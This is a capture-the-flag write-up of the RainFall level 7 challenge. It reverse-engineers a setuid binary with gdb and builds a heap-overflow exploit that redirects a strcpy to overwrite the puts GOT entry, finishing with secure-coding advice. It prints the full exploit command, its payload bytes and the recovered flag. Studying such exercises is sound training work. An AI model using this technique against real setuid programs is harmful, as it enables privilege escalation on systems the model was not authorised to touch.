# Level 7

## Initial Analysis

### 1. Examine the Binary
```bash
level7@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5252 Mar  6  2016 level7
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile

level7@RainFall:~$ file level7
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x86ec4bbc6ff1af605ab9881ead5cd71c95b6e8ad, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level8** user
- When executed, runs with **level8 privileges**

### 2. Test Basic Execution Behavior
```bash
level7@RainFall:~$ ./level7
Segmentation fault

level7@RainFall:~$ ./level7 arg1
Segmentation fault

level7@RainFall:~$ ./level7 arg1 arg2
~~

level7@RainFall:~$ ./level7 hello world test
~~
```

**Critical Pattern Analysis:**
- **0 arguments**: Segmentation fault (accesses argv[1] when it doesn't exist)
- **1 argument**: Segmentation fault (accesses argv[2] when it doesn't exist)  
- **2+ arguments**: Prints "~~" and exits normally
- **Conclusion**: Program expects both argv[1] and argv[2] to exist

**Key Questions:**
1. Where does "~~" output come from? No puts() visible in normal execution trace
2. Why does it need exactly 2 arguments?
3. What happens between argument processing and output?

## Reverse Engineering - Uncovering the Complex Architecture

### 3. Function Analysis - Discovering Hidden Functionality
```bash
level7@RainFall:~$ gdb level7
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x080483b0  printf@plt
0x080483c0  fgets@plt  
0x080483d0  time@plt
0x080483e0  strcpy@plt      ← Dangerous function (appears twice!)
0x080483f0  malloc@plt      ← Multiple dynamic allocations
0x08048400  puts@plt        ← Source of "~~" output
0x08048430  fopen@plt       ← File operations  
0x080484f4  m               ← Hidden function!
0x08048521  main
```

**Function Discovery Analysis:**
- **Two dangerous functions**: `strcpy()` used multiple times, `malloc()` for heap operations
- **Hidden function `m()`**: Not called in normal execution - what does it do?
- **File operations**: `fopen()`/`fgets()` suggest file reading
- **puts()**: Source of "~~" output - potential hijack target

### 4. Analyzing the Hidden Function m()
```bash
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)        # NULL parameter
   0x08048501 <+13>:    call   0x80483d0 <time@plt>  # time(NULL)
   0x08048506 <+18>:    mov    $0x80486e0,%edx    # Load format string
   0x0804850b <+23>:    mov    %eax,0x8(%esp)     # time value as 3rd param
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)  # Global buffer as 2nd param
   0x08048517 <+35>:    mov    %edx,(%esp)        # Format string as 1st param  
   0x0804851a <+38>:    call   0x80483b0 <printf@plt> # printf(format, buffer, time)
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret

(gdb) x/s 0x80486e0
0x80486e0:  "%s - %d\n"
```

**Hidden Function Analysis:**
- **Function `m()` at 0x080484f4**: Calls printf with format string "%s - %d\n"
- **Uses global buffer 0x8049960**: Second parameter to printf (likely contains flag)
- **Adds timestamp**: time() result as third parameter  
- **Never called normally**: This is our target - contains flag printing logic!

### 5. Getting Function Address
```bash
(gdb) x m
0x80484f4 <m>:  0x83e58955
```

**Target Address Confirmed:**
- **Function `m()` address**: `0x080484f4`
- **Goal**: Redirect program execution to call this function instead of normal puts()

## Understanding the Complex Heap Architecture

### 6. Main Function Deep Dive - The Multi-Allocation Pattern
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
   0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp        # Local stack space

   # First allocation pair - data1 structure
   0x0804852a <+9>:     movl   $0x8,(%esp)       # malloc(8)
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)   # Store data1 at ESP+28
   0x0804853a <+25>:    mov    0x1c(%esp),%eax   
   0x0804853e <+29>:    movl   $0x1,(%eax)       # data1->id = 1

   # data1 buffer allocation  
   0x08048544 <+35>:    movl   $0x8,(%esp)       # malloc(8)
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    %eax,%edx
   0x08048552 <+49>:    mov    0x1c(%esp),%eax   
   0x08048556 <+53>:    mov    %edx,0x4(%eax)    # data1->buffer = malloc result

   # Second allocation pair - data2 structure
   0x08048559 <+56>:    movl   $0x8,(%esp)       # malloc(8)
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    %eax,0x18(%esp)   # Store data2 at ESP+24
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)       # data2->id = 2

   # data2 buffer allocation
   0x08048573 <+82>:    movl   $0x8,(%esp)       # malloc(8)  
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    %eax,%edx
   0x08048581 <+96>:    mov    0x18(%esp),%eax
   0x08048585 <+100>:   mov    %edx,0x4(%eax)    # data2->buffer = malloc result
```

**Heap Architecture Discovery:**
The program creates **two linked data structures** on the heap:

```
data1 structure (8 bytes):
[4 bytes: id=1][4 bytes: pointer to buffer1]

buffer1 (8 bytes):
[8 bytes allocated for argv[1] data]

data2 structure (8 bytes):  
[4 bytes: id=2][4 bytes: pointer to buffer2]

buffer2 (8 bytes):
[8 bytes allocated for argv[2] data]
```

## The Dual strcpy() Vulnerability Chain

### 7. First strcpy() - The Heap Overflow Source
```bash
   # Prepare first strcpy: argv[1] → data1->buffer
   0x08048588 <+103>:   mov    0xc(%ebp),%eax    # argv
   0x0804858b <+106>:   add    $0x4,%eax         # argv[1]
   0x0804858e <+109>:   mov    (%eax),%eax       # dereference argv[1]
   0x08048590 <+111>:   mov    %eax,%edx         # source = argv[1]
   0x08048592 <+113>:   mov    0x1c(%esp),%eax   # load data1 pointer
   0x08048596 <+117>:   mov    0x4(%eax),%eax    # data1->buffer address
   0x08048599 <+120>:   mov    %edx,0x4(%esp)    # push argv[1]
   0x0804859d <+124>:   mov    %eax,(%esp)       # push data1->buffer
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>  # strcpy(data1->buffer, argv[1])
```

**First Vulnerability:**
- **strcpy() with no bounds checking** copies argv[1] to 8-byte buffer1
- **Overflow potential**: If argv[1] > 8 bytes, overflows into adjacent heap memory
- **Critical target**: Can overflow into data2 structure, corrupting data2->buffer pointer

### 8. Second strcpy() - The Exploitation Vector  
```bash
   # Prepare second strcpy: argv[2] → data2->buffer
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax    # argv
   0x080485a8 <+135>:   add    $0x8,%eax         # argv[2]
   0x080485ab <+138>:   mov    (%eax),%eax       # dereference argv[2]
   0x080485ad <+140>:   mov    %eax,%edx         # source = argv[2]
   0x080485af <+142>:   mov    0x18(%esp),%eax   # load data2 pointer  
   0x080485b3 <+146>:   mov    0x4(%eax),%eax    # data2->buffer address ← POTENTIALLY CORRUPTED!
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)    # push argv[2]
   0x080485ba <+153>:   mov    %eax,(%esp)       # push (possibly corrupted) address
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>  # strcpy(corrupted_address, argv[2])
```

**Second Vulnerability Chain:**
- **Uses data2->buffer as destination** - but this pointer may be corrupted!
- **If first overflow corrupted data2->buffer**: Second strcpy writes to arbitrary address
- **Attack vector**: Control where argv[2] gets written by corrupting the destination pointer

### 9. Final Program Operations
```bash
   # File operations (read flag data)
   0x080485c2 <+161>:   mov    $0x80486e9,%edx   # filename  
   0x080485c7 <+166>:   mov    $0x80486eb,%eax   # mode "r"
   0x080485cc <+171>:   mov    %edx,0x4(%esp)
   0x080485d0 <+175>:   mov    %eax,(%esp)
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>    # fopen()
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
   0x080485dc <+187>:   movl   $0x44,0x4(%esp)   # 68 bytes
   0x080485e4 <+195>:   movl   $0x8049960,(%esp)  # global buffer
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>    # fgets(global_buf, 68, file)

   # Final output - HIJACK TARGET!
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)  # "~~" string
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>     # puts("~~") ← HIJACK THIS!
```

**Program End Analysis:**
- **File operations**: Reads 68 bytes into global buffer 0x8049960 (contains flag data!)
- **puts("~~") call**: Final output - this is our hijack target
- **Strategy**: Redirect puts() to call m() instead, which will print the flag data

## The Exploitation Strategy - Indirect GOT Hijacking

### 10. Understanding the Attack Chain
```
Step 1: Heap Structure Corruption
First strcpy overflows buffer1 → corrupts data2->buffer pointer

Step 2: Pointer Redirection
Change data2->buffer from pointing to buffer2 → to pointing at puts() GOT entry

Step 3: GOT Overwrite  
Second strcpy writes argv[2] to puts() GOT entry → overwrites puts address

Step 4: Function Hijacking
puts("~~") call → jumps to m() function → prints flag with timestamp
```

### 11. Finding the GOT Entry for puts()
```bash
level7@RainFall:~$ objdump -R level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```

**GOT Entry Discovery:**
- **puts() GOT address**: `0x08049928`
- **Target**: Overwrite this address with `0x080484f4` (address of m())
- **Method**: Corrupt data2->buffer to point here, then use second strcpy

### 12. Calculating the Overflow Offset
```bash
# Test overflow distance with De Bruijn pattern
level7@RainFall:~$ python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8A"' > /tmp/pattern

level7@RainFall:~$ gdb ./level7
(gdb) run $(cat /tmp/pattern) BBBB
Starting program: /home/user/level7/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8A BBBB

Program received signal SIGSEGV, Segmentation fault.
0xb7eb1922 in ?? ()
```

**Different Crash Pattern:**
- **Not crashing on instruction fetch** like previous levels
- **Crashing during memory access** - suggests we're corrupting a pointer used for memory access
- **This confirms**: We're corrupting data2->buffer pointer, causing second strcpy to write to invalid address

### 13. Finding the Exact Offset Through Analysis
```
Heap Layout Analysis:
buffer1: 8 bytes allocated
Heap metadata: ~8 bytes (typical malloc overhead)  
data2 structure: 4 bytes (id) + 4 bytes (buffer pointer)

Distance calculation:
buffer1 start → data2->buffer field = 8 + 8 + 4 = 20 bytes

Verification:
20 bytes of padding + target address should corrupt data2->buffer pointer
```

### 14. Memory Layout During Exploitation

**Normal Heap State:**
```
┌─────────────────────┐ ← data1: {id=1, buffer_ptr}
│ data1 structure     │
├─────────────────────┤ ← buffer1 (8 bytes)
│ buffer1             │   ← argv[1] destination
├─────────────────────┤ ← data2: {id=2, buffer_ptr}  
│ data2 structure     │   buffer_ptr points to buffer2
├─────────────────────┤ ← buffer2 (8 bytes)
│ buffer2             │   ← argv[2] destination (normal)
└─────────────────────┘
```

**Exploited Heap State:**
```
┌─────────────────────┐ ← data1: {id=1, buffer_ptr}
│ data1 structure     │
├─────────────────────┤ ← buffer1 (overflow source)
│ AAAAAAAAAAAAAAAAAAA │   ← 20 bytes of padding
├─────────────────────┤ ← data2: {id=2, CORRUPTED}
│ data2 structure     │   buffer_ptr now = 0x08049928 (puts GOT!)
├─────────────────────┤ ← buffer2 (unused)
│ buffer2             │   
└─────────────────────┘

Result: Second strcpy writes argv[2] to puts() GOT entry instead of buffer2!
```

## Exploitation Implementation

### 15. Crafting the Dual Payload
```bash
# First argument: Overflow buffer1 and corrupt data2->buffer pointer
# 20 bytes padding + puts GOT address (little-endian)
arg1="A"*20 + "\x28\x99\x04\x08"

# Second argument: Function address to write to GOT  
# m() function address (little-endian)
arg2="\xf4\x84\x04\x08"
```

**Payload Breakdown:**
- **arg1**: `"A"*20 + "\x28\x99\x04\x08"`
  - 20 bytes: Fill buffer1 and reach data2->buffer pointer
  - `\x28\x99\x04\x08`: puts() GOT address (0x08049928) in little-endian
  
- **arg2**: `"\xf4\x84\x04\x08"`  
  - `\xf4\x84\x04\x08`: m() function address (0x080484f4) in little-endian

### 16. Understanding Little-Endian Encoding
```
puts() GOT address: 0x08049928
Little-endian bytes: \x28\x99\x04\x08

m() function address: 0x080484f4  
Little-endian bytes: \xf4\x84\x04\x08

Why little-endian?
Intel x86 stores multi-byte values with least significant byte first
```

### 17. Execute the Exploit
```bash
level7@RainFall:~$ ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1623455678
```

**Success Analysis:**
1. **First strcpy executed**: Overflowed buffer1 with 20 A's + puts GOT address
2. **Pointer corruption**: data2->buffer now points to puts() GOT entry (0x08049928)
3. **Second strcpy executed**: Wrote m() address (0x080484f4) to puts() GOT entry  
4. **GOT hijacking successful**: puts() now points to m() instead of real puts()
5. **Function redirection**: When puts("~~") was called, m() executed instead
6. **Flag retrieved**: m() printed flag data with timestamp using printf()

### 18. Memory State During Exploitation

**Before Exploit:**
```
Heap:
data2->buffer points to: [buffer2 address]

GOT Table:
puts@got (0x08049928): [address of real puts() in libc]
```

**After First strcpy:**
```
Heap:
data2->buffer points to: [0x08049928] ← now points to puts GOT!

GOT Table:  
puts@got (0x08049928): [address of real puts() in libc] ← unchanged yet
```

**After Second strcpy:**
```
Heap:
data2->buffer points to: [0x08049928] ← still points to puts GOT

GOT Table:
puts@got (0x08049928): [0x080484f4] ← now points to m() function!
```

**During puts("~~") call:**
```
Normal: puts@plt → GOT[0x08049928] → real puts() → prints "~~"
Hijacked: puts@plt → GOT[0x08049928] → m() function → prints flag!
```

## Advanced Heap Exploitation Analysis

### 19. Key Concepts Learned

**Heap Structure Corruption:**
- **Complex data structures** on heap create new attack vectors
- **Pointer corruption** enables redirection of subsequent operations
- **Multi-stage attacks** chain multiple vulnerabilities for complex exploitation

**Indirect GOT Hijacking:**
- **Direct GOT overwrite** (Level 5): Format string writes directly to GOT
- **Indirect GOT overwrite** (Level 7): Heap corruption redirects later write to GOT
- **More complex but stealthier** - harder to detect and prevent

**Vulnerability Chaining:**
- **First vulnerability**: Heap overflow corrupts data structure
- **Second vulnerability**: strcpy uses corrupted destination pointer
- **Combined effect**: Arbitrary write capability through corruption chain

### 20. Modern Protections and Bypasses

**Heap Protection Mechanisms:**
- **Heap cookies**: Detect heap metadata corruption (wouldn't help here - we corrupt user data)
- **ASLR**: Randomizes heap layout (makes offsets unpredictable)
- **Heap hardening**: Additional integrity checks
- **Control Flow Integrity**: Validates indirect calls

**Why This Attack Works:**
- **Predictable heap layout**: malloc calls in fixed order create consistent layout
- **No metadata corruption**: We corrupt user data, not heap management structures
- **No CFI protection**: GOT entries not validated
- **Legacy system**: Missing modern heap protections

### 21. Secure Coding Analysis

**What Went Wrong:**
```c
// Vulnerable pattern (conceptual):
struct data {
    int id;
    char *buffer;
};

struct data *d1 = malloc(sizeof(struct data));
d1->buffer = malloc(8);
struct data *d2 = malloc(sizeof(struct data));  
d2->buffer = malloc(8);

strcpy(d1->buffer, argv[1]);  // No bounds checking!
strcpy(d2->buffer, argv[2]);  // Uses potentially corrupted pointer!
```

**Secure Alternatives:**
```c
// Safer approach:
strncpy(d1->buffer, argv[1], 7);  // Bounds checking
d1->buffer[7] = '\0';             // Ensure null termination

// Validate pointer before use:
if (d2->buffer < heap_start || d2->buffer > heap_end) {
    error("Corrupted pointer detected");
}
strncpy(d2->buffer, argv[2], 7);
```